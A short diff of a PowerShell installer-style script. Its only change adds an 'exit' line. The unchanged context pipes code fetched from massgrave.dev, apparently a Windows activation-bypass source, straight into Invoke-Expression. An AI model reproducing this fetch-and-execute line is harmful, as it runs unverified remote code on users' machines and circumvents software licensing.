@@ -10,3 +10,5 @@ $setupProcess = Start-Process -FilePath $savePath -PassThru
 
 # Run the additional command
 Invoke-Expression (Invoke-RestMethod -Uri "https://massgrave.dev/get")
+
+exit
